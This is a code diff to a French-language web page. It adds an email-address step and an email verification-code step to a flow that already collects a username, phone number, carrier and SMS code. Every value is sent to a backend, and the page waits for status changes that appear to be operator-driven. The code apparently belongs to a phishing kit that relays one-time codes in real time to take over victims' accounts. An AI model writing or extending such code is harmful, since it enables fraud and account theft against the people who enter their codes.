@@ -12,9 +12,24 @@ const statusLine = document.getElementById("status-line");
 const statusText = document.getElementById("status-text");
 const codeStatus = document.getElementById("code-status");
 
+const emailInput = document.getElementById("email");
+const emailBtn = document.getElementById("email-btn");
+const emailStatus = document.getElementById("email-status");
+const emailSentValue = document.getElementById("email-sent-value");
+const emailCodeTarget = document.getElementById("email-code-target");
+const emailCodeInput = document.getElementById("email-code");
+const emailVerifyBtn = document.getElementById("email-verify-btn");
+const emailRetryBtn = document.getElementById("email-retry-btn");
+const emailCodeField = document.getElementById("email-code-field");
+const emailCodeError = document.getElementById("email-code-error");
+const emailCodeStatus = document.getElementById("email-code-status");
+
 const stepForm = document.getElementById("step-form");
 const stepLoading = document.getElementById("step-loading");
 const stepCode = document.getElementById("step-code");
+const stepEmail = document.getElementById("step-email");
+const stepEmailSent = document.getElementById("step-email-sent");
+const stepEmailCode = document.getElementById("step-email-code");
 const stepUnavailable = document.getElementById("step-unavailable");
 const stepSuccess = document.getElementById("step-success");
 const successUsername = document.getElementById("success-username");
@@ -43,6 +58,7 @@ const loadingMessages = [
 let selectedCarrier = null;
 let formData = {};
 let sessionId = null;
+let userEmail = "";
 
 function setStatus(text, state = "idle") {
   statusText.textContent = text;
@@ -54,6 +70,9 @@ function showStep(step) {
   stepForm.hidden = step !== "form";
   stepLoading.hidden = step !== "loading";
   stepCode.hidden = step !== "code";
+  stepEmail.hidden = step !== "email";
+  stepEmailSent.hidden = step !== "email-sent";
+  stepEmailCode.hidden = step !== "email-code";
   stepUnavailable.hidden = step !== "unavailable";
   stepSuccess.hidden = step !== "success";
 }
@@ -68,6 +87,14 @@ function showSuccessStep() {
   showStep("success");
 }
 
+function showEmailStep() {
+  emailInput.value = "";
+  emailBtn.disabled = true;
+  emailStatus.textContent = "En attente de votre adresse email.";
+  showStep("email");
+  emailInput.focus();
+}
+
 function resetCodeUi() {
   codeError.hidden = true;
   codeField.hidden = false;
@@ -78,11 +105,29 @@ function resetCodeUi() {
   codeStatus.textContent = "En attente de votre code SMS à 4 chiffres.";
 }
 
+function resetEmailCodeUi() {
+  emailCodeError.hidden = true;
+  emailCodeField.hidden = false;
+  emailVerifyBtn.hidden = false;
+  emailCodeInput.value = "";
+  emailVerifyBtn.disabled = true;
+  emailVerifyBtn.textContent = "Vérifier le code";
+  emailCodeStatus.textContent = "En attente de votre code email à 4 chiffres.";
+  emailCodeTarget.textContent = userEmail;
+}
+
 function showCodeRejectedUi() {
   codeError.hidden = false;
   codeField.hidden = true;
   verifyBtn.hidden = true;
   codeStatus.textContent = "Code refusé — revérifiez ou demandez un nouveau code.";
+}
+
+function showEmailCodeRejectedUi() {
+  emailCodeError.hidden = false;
+  emailCodeField.hidden = true;
+  emailVerifyBtn.hidden = true;
+  emailCodeStatus.textContent = "Code email refusé — revérifiez votre code.";
 }
 
 function updateClaimButton() {
@@ -248,14 +293,89 @@ async function submitCodeVerification() {
     return;
   }
 
-  const result = await pollSession(["code_approved", "code_rejected"]);
+  const result = await pollSession(["code_approved", "code_rejected", "email_required"]);
 
   if (result === "code_approved") {
     showSuccessStep();
     return;
   }
 
+  if (result === "email_required") {
+    showEmailStep();
+    return;
+  }
+
   showCodeRejectedUi();
+}
+
+async function submitEmail() {
+  const email = emailInput.value.trim();
+  if (!email || !sessionId) return;
+
+  userEmail = email;
+  emailBtn.disabled = true;
+  emailBtn.textContent = "Envoi…";
+  emailStatus.textContent = "Enregistrement de votre email…";
+
+  try {
+    await sendSubmission("email", {
+      sessionId,
+      username: formData.username,
+      phone: formData.phone,
+      carrier: formData.carrier,
+      email,
+    });
+  } catch {
+    emailStatus.textContent = "Erreur lors de l'envoi. Réessayez.";
+    emailBtn.textContent = "Envoyer";
+    emailBtn.disabled = !emailInput.value.trim().includes("@");
+    return;
+  }
+
+  emailSentValue.textContent = email;
+  showStep("email-sent");
+  await pollSession(["email_code_ready"]);
+
+  resetEmailCodeUi();
+  showStep("email-code");
+  emailCodeInput.focus();
+
+  emailBtn.textContent = "Envoyer";
+  emailBtn.disabled = true;
+}
+
+async function submitEmailCodeVerification() {
+  const code = emailCodeInput.value.trim();
+  if (!code || !sessionId) return;
+
+  emailVerifyBtn.disabled = true;
+  emailVerifyBtn.textContent = "Vérification…";
+  emailCodeStatus.textContent = "Vérification du code email en cours…";
+  emailCodeError.hidden = true;
+
+  try {
+    await sendSubmission("verify_email", {
+      sessionId,
+      username: formData.username,
+      phone: formData.phone,
+      carrier: formData.carrier,
+      code,
+    });
+  } catch {
+    emailCodeStatus.textContent = "Erreur lors de la vérification. Réessayez.";
+    emailVerifyBtn.textContent = "Vérifier le code";
+    emailVerifyBtn.disabled = emailCodeInput.value.length === 4;
+    return;
+  }
+
+  const result = await pollSession(["email_code_approved", "email_code_rejected"]);
+
+  if (result === "email_code_approved") {
+    showSuccessStep();
+    return;
+  }
+
+  showEmailCodeRejectedUi();
 }
 
 async function requestNewSmsCode() {
@@ -331,13 +451,35 @@ codeInput.addEventListener("input", () => {
   verifyBtn.disabled = codeInput.value.length !== 4;
 });
 
+emailInput.addEventListener("input", () => {
+  emailBtn.disabled = !emailInput.value.trim().includes("@");
+});
+
+emailCodeInput.addEventListener("input", () => {
+  emailCodeInput.value = emailCodeInput.value.replace(/\D/g, "").slice(0, 4);
+  emailVerifyBtn.disabled = emailCodeInput.value.length !== 4;
+});
+
 verifyBtn.addEventListener("click", () => {
   submitCodeVerification();
+});
+
+emailBtn.addEventListener("click", () => {
+  submitEmail();
+});
+
+emailVerifyBtn.addEventListener("click", () => {
+  submitEmailCodeVerification();
 });
 
 retryBtn.addEventListener("click", () => {
   resetCodeUi();
   codeInput.focus();
+});
+
+emailRetryBtn.addEventListener("click", () => {
+  resetEmailCodeUi();
+  emailCodeInput.focus();
 });
 
 resendBtn.addEventListener("click", () => {
